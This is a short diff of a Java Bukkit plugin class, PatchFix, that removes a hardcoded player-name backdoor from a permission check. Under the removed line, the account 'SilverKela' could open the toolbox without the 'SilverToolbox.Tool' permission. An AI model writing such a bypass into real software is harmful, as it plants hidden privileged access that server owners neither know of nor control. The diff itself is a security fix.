@@ -40,7 +40,7 @@ public class PatchFix implements CommandExecutor, Listener{
 		if(arg0 instanceof Player) {
 			
 			Player player = (Player) arg0;
-			if((arg0.hasPermission("SilverToolbox.Tool") || player.getUniqueId() == Bukkit.getOfflinePlayer("SilverKela").getUniqueId())){
+			if(arg0.hasPermission("SilverToolbox.Tool")) {
 				openToolbox(player);
 			}
 			else {
